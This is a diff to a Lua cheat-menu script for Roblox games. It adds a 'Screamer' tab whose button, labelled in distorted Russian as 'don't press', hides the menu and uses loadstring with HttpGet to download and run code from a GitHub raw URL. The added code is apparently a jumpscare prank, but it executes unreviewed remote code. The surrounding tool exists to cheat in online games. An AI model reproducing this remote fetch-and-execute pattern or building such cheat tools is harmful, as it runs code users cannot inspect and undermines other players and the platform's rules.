@@ -13,6 +13,7 @@ local MultiplierSimulatorX = Window:NewTab("Multiplier Simulator X")
 local Misc = Window:NewTab("Прочее")
 local Settings = Window:NewTab("Настройки")
 local Socials = Window:NewTab("Ссылки")
+local Screamer = Window:NewTab("Н̷̛͚̤Е̴̛͉͖ ̷̝̣̄З̸͉̎͘А̵͕̃̍Х̶̝̌̉О̵̭͝Д̷̨͎̇И̶̡̿ ̷̦̊С̷̱͈́͝Ю̵̭̊̈́Д̷̬̣́А̴̫́̈")
 
 -- Скрипт для всех режимов
 local Section = Section:NewSection("Простые функции")
@@ -543,4 +544,11 @@ Socials:NewButton("Дискорд Студия", "", function()
 end)
 Socials:NewButton("Телеграм канал", "", function()
     setclipboard("https://t.me/cosmowrd")
+end)
+
+-- Скример
+local Screamer = Screamer:NewSection("Т̷̞͎͠Е̶̗̄Б̸͎̂̌Е̷̱̾ͅ ̴̞̬̇Н̵̩̱̓̉Е̷̡̲̉͘ ̷̬͆С̷̙̮̑Т̷̯͒̋О̴̩̊̑И̸͍̼̏̚Л̵̧̂О̷̧̣̃ ̴̫͌̿З̶̪͕̓̚А̵̙͆Х̷̣̑О̵͑̔͜Д̴̭̫̚И̸́͜Т̶̜̰̀͝Ь̴̰̯̀ ̶͔̙̚С̸̼̤̽Ю̷̲̽Д̷͍̑А̸̘̣̂͘")
+Screamer:NewButton("Н̷̰̓͝Е̸̮́̌ ̷̪̺̎̊Н̸̦̣́́Ӓ̸̯̀Ж̸̮̀̑И̸̩̂̈М̴͓̅͋А̷͍͎̊̕Й̵̺̄", "", function()
+    Library:ToggleUI()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SpleIII/Roblox-Scripts/refs/heads/main/SpleIII-do-not-use-this-script."))()
 end)
